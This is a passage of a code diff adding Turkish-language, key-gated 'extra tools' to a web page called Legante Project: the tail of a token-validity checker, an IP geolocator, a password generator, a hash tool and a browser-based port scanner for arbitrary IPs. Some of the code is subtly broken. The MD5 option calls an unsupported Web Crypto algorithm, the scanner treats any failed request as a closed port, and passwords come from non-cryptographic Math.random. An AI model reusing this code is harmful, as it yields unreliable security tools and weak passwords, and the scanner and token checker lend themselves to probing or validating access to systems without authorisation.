+        outDiv.innerHTML = `<span style="color:#22c55e;">✅ KONTROL TAMAMLANDI!</span><br>📈 Toplam: ${tokens.length} | ✅ Geçerli: ${valid}<br><br>`+results.join('<br>');
+        check.disabled = false;
+    };
+};
+
+// 3. IP LOCATOR
+ipLink.onclick = (e) => {
+    e.preventDefault();
+    if (!unlocked) { showKeyModal(()=>{}); return; }
+    const modal = createToolModal('IP Locator', `
+        <input type="text" id="ip-address" placeholder="IP Adresi: 8.8.8.8" style="width:100%; padding:12px; margin-bottom:12px; background:rgba(0,0,0,0.5); border:1px solid rgba(168,85,247,0.3); border-radius:12px; color:white;">
+        <button id="locate-ip" style="width:100%; padding:12px; background:linear-gradient(135deg,#6c5ce7,#a855f7); border:none; border-radius:12px; color:white; font-weight:700; cursor:pointer;">KONUM BUL</button>
+        <div id="ip-out" style="margin-top:15px; padding:10px; background:rgba(0,0,0,0.4); border-radius:12px; font-size:0.8rem;"></div>
+    `);
+    const locate = document.getElementById('locate-ip');
+    const ipIn = document.getElementById('ip-address');
+    const out = document.getElementById('ip-out');
+    locate.onclick = async () => {
+        const ip = ipIn.value.trim();
+        if(!ip) { out.innerHTML = '<span style="color:#ef4444;">❌ IP girin!</span>'; return; }
+        out.innerHTML = '<span style="color:#f59e0b;">🔍 Aranıyor...</span>';
+        try {
+            const res = await fetch(`https://ipapi.co/${ip}/json/`);
+            const data = await res.json();
+            if(data.error) throw new Error();
+            out.innerHTML = `
+                <span style="color:#22c55e;">✅ IP: ${data.ip}</span><br>
+                📍 Ülke: ${data.country_name} (${data.country_code})<br>
+                🏙️ Şehir: ${data.city || 'Bilinmiyor'}<br>
+                📮 Posta Kodu: ${data.postal || 'Bilinmiyor'}<br>
+                📍 Bölge: ${data.region || 'Bilinmiyor'}<br>
+                🌐 ISP: ${data.org || 'Bilinmiyor'}<br>
+                📞 Telefon Kodu: ${data.country_calling_code || 'Bilinmiyor'}
+            `;
+        } catch(e) {
+            out.innerHTML = '<span style="color:#ef4444;">❌ IP bulunamadı veya geçersiz!</span>';
+        }
+    };
+};
+
+// 4. PASSWORD GENERATOR
+passLink.onclick = (e) => {
+    e.preventDefault();
+    if (!unlocked) { showKeyModal(()=>{}); return; }
+    const modal = createToolModal('Password Generator', `
+        <div style="display:flex; gap:10px; margin-bottom:15px;">
+            <input type="number" id="pass-length" value="12" min="6" max="32" style="flex:1; padding:12px; background:rgba(0,0,0,0.5); border:1px solid rgba(168,85,247,0.3); border-radius:12px; color:white;">
+            <div style="display:flex; gap:10px; align-items:center;">
+                <label><input type="checkbox" id="use-upper" checked> A-Z</label>
+                <label><input type="checkbox" id="use-lower" checked> a-z</label>
+                <label><input type="checkbox" id="use-numbers" checked> 0-9</label>
+                <label><input type="checkbox" id="use-symbols" checked> !@#$</label>
+            </div>
+        </div>
+        <button id="generate-pass" style="width:100%; padding:12px; background:linear-gradient(135deg,#6c5ce7,#a855f7); border:none; border-radius:12px; color:white; font-weight:700; cursor:pointer;">ŞİFRE OLUŞTUR</button>
+        <div id="pass-out" style="margin-top:15px; padding:15px; background:rgba(0,0,0,0.4); border-radius:12px; font-family:monospace; font-size:1rem; text-align:center; word-break:break-all;"></div>
+    `);
+    const generate = document.getElementById('generate-pass');
+    const lengthIn = document.getElementById('pass-length');
+    const upperChk = document.getElementById('use-upper');
+    const lowerChk = document.getElementById('use-lower');
+    const numChk = document.getElementById('use-numbers');
+    const symChk = document.getElementById('use-symbols');
+    const out = document.getElementById('pass-out');
+    generate.onclick = () => {
+        let chars = '';
+        if(upperChk.checked) chars += 'ABCDEFGHJKLMNPQRSTUVWXYZ';
+        if(lowerChk.checked) chars += 'abcdefghijkmnopqrstuvwxyz';
+        if(numChk.checked) chars += '23456789';
+        if(symChk.checked) chars += '!@#$%^&*()_+-=[]{}<>?';
+        if(!chars) { out.innerHTML = '<span style="color:#ef4444;">❌ En az bir karakter tipi seçin!</span>'; return; }
+        let length = parseInt(lengthIn.value) || 12;
+        let password = '';
+        for(let i=0; i<length; i++) password += chars[Math.floor(Math.random() * chars.length)];
+        out.innerHTML = `<span style="color:#22c55e;">🔐 ${password}</span><br><button id="copy-pass" style="margin-top:10px; padding:6px 12px; background:rgba(255,255,255,0.1); border:none; border-radius:8px; color:white; cursor:pointer;">Kopyala</button>`;
+        document.getElementById('copy-pass')?.addEventListener('click', () => {
+            navigator.clipboard.writeText(password);
+            alert('Şifre kopyalandı!');
+        });
+    };
+    generate.click();
+};
+
+// 5. HASH TOOL (MD5, SHA1, SHA256)
+hashLink.onclick = (e) => {
+    e.preventDefault();
+    if (!unlocked) { showKeyModal(()=>{}); return; }
+    const modal = createToolModal('Hash Tool (MD5, SHA1, SHA256)', `
+        <textarea id="hash-input" rows="3" placeholder="Metin girin..." style="width:100%; padding:12px; margin-bottom:12px; background:rgba(0,0,0,0.5); border:1px solid rgba(168,85,247,0.3); border-radius:12px; color:white;"></textarea>
+        <div style="display:flex; gap:10px; margin-bottom:15px;">
+            <button id="hash-md5" style="flex:1; padding:10px; background:rgba(168,85,247,0.2); border:1px solid rgba(168,85,247,0.3); border-radius:10px; color:white; cursor:pointer;">MD5</button>
+            <button id="hash-sha1" style="flex:1; padding:10px; background:rgba(168,85,247,0.2); border:1px solid rgba(168,85,247,0.3); border-radius:10px; color:white; cursor:pointer;">SHA1</button>
+            <button id="hash-sha256" style="flex:1; padding:10px; background:rgba(168,85,247,0.2); border:1px solid rgba(168,85,247,0.3); border-radius:10px; color:white; cursor:pointer;">SHA256</button>
+        </div>
+        <div id="hash-out" style="padding:15px; background:rgba(0,0,0,0.4); border-radius:12px; font-family:monospace; font-size:0.75rem; word-break:break-all;"></div>
+    `);
+    const input = document.getElementById('hash-input');
+    const out = document.getElementById('hash-out');
+    
+    async function computeHash(algo, text) {
+        const encoder = new TextEncoder();
+        const data = encoder.encode(text);
+        const hashBuffer = await crypto.subtle.digest(algo, data);
+        const hashArray = Array.from(new Uint8Array(hashBuffer));
+        return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+    }
+    
+    document.getElementById('hash-md5').onclick = async () => {
+        if(!input.value.trim()) { out.innerHTML = '<span style="color:#ef4444;">❌ Metin girin!</span>'; return; }
+        const hash = await computeHash('MD5', input.value);
+        out.innerHTML = `<span style="color:#22c55e;">MD5:</span><br>${hash}`;
+    };
+    document.getElementById('hash-sha1').onclick = async () => {
+        if(!input.value.trim()) { out.innerHTML = '<span style="color:#ef4444;">❌ Metin girin!</span>'; return; }
+        const hash = await computeHash('SHA-1', input.value);
+        out.innerHTML = `<span style="color:#22c55e;">SHA1:</span><br>${hash}`;
+    };
+    document.getElementById('hash-sha256').onclick = async () => {
+        if(!input.value.trim()) { out.innerHTML = '<span style="color:#ef4444;">❌ Metin girin!</span>'; return; }
+        const hash = await computeHash('SHA-256', input.value);
+        out.innerHTML = `<span style="color:#22c55e;">SHA256:</span><br>${hash}`;
+    };
+};
+
+// 6. PORT SCANNER
+portLink.onclick = (e) => {
+    e.preventDefault();
+    if (!unlocked) { showKeyModal(()=>{}); return; }
+    const modal = createToolModal('Port Scanner (Basit)', `
+        <input type="text" id="scan-ip" placeholder="IP Adresi: 127.0.0.1" style="width:100%; padding:12px; margin-bottom:12px; background:rgba(0,0,0,0.5); border:1px solid rgba(168,85,247,0.3); border-radius:12px; color:white;">
+        <div style="display:flex; gap:10px; margin-bottom:15px;">
+            <input type="number" id="start-port" placeholder="Başlangıç" value="1" style="flex:1; padding:12px; background:rgba(0,0,0,0.5); border:1px solid rgba(168,85,247,0.3); border-radius:12px; color:white;">
+            <input type="number" id="end-port" placeholder="Bitiş" value="100" style="flex:1; padding:12px; background:rgba(0,0,0,0.5); border:1px solid rgba(168,85,247,0.3); border-radius:12px; color:white;">
+        </div>
+        <button id="start-scan" style="width:100%; padding:12px; background:linear-gradient(135deg,#6c5ce7,#a855f7); border:none; border-radius:12px; color:white; font-weight:700; cursor:pointer;">TARA</button>
+        <div id="scan-out" style="margin-top:15px; padding:10px; background:rgba(0,0,0,0.4); border-radius:12px; font-size:0.75rem; max-height:300px; overflow:auto;"></div>
+    `);
+    const startBtn = document.getElementById('start-scan');
+    const ipIn = document.getElementById('scan-ip');
+    const startPortIn = document.getElementById('start-port');
+    const endPortIn = document.getElementById('end-port');
+    const out = document.getElementById('scan-out');
+    
+    startBtn.onclick = async () => {
+        const ip = ipIn.value.trim();
+        const startPort = parseInt(startPortIn.value) || 1;
+        const endPort = parseInt(endPortIn.value) || 100;
+        if(!ip) { out.innerHTML = '<span style="color:#ef4444;">❌ IP girin!</span>'; return; }
+        if(startPort > endPort) { out.innerHTML = '<span style="color:#ef4444;">❌ Başlangıç portu bitişten küçük olmalı!</span>'; return; }
+        startBtn.disabled = true;
+        out.innerHTML = '<span style="color:#f59e0b;">🔍 Taranıyor...</span>';
+        let results = [];
+        for(let port = startPort; port <= endPort && port <= 1024; port++) {
+            try {
+                const controller = new AbortController();
+                const timeout = setTimeout(() => controller.abort(), 1000);
+                const res = await fetch(`http://${ip}:${port}`, { mode: 'no-cors', signal: controller.signal });
+                clearTimeout(timeout);
+                results.push(`<span style="color:#22c55e;">✅ Port ${port} açık</span>`);
+            } catch(e) {
+                results.push(`<span style="color:#ef4444;">❌ Port ${port} kapalı</span>`);
+            }
+            out.innerHTML = `<span style="color:#f59e0b;">🔄 Taranıyor: ${port}/${endPort}</span><br>` + results.slice(-10).join('<br>');
+            await new Promise(r => setTimeout(r, 100));
+        }
+        out.innerHTML = `<span style="color:#22c55e;">✅ TARAMA TAMAMLANDI!</span><br>` + results.join('<br>');
+        startBtn.disabled = false;
+    };
+};
+
+updateExtraToolsUI();
+console.log('✅ Legante Project v3.0 | 6 Extra Tools | Key sistemi aktif');
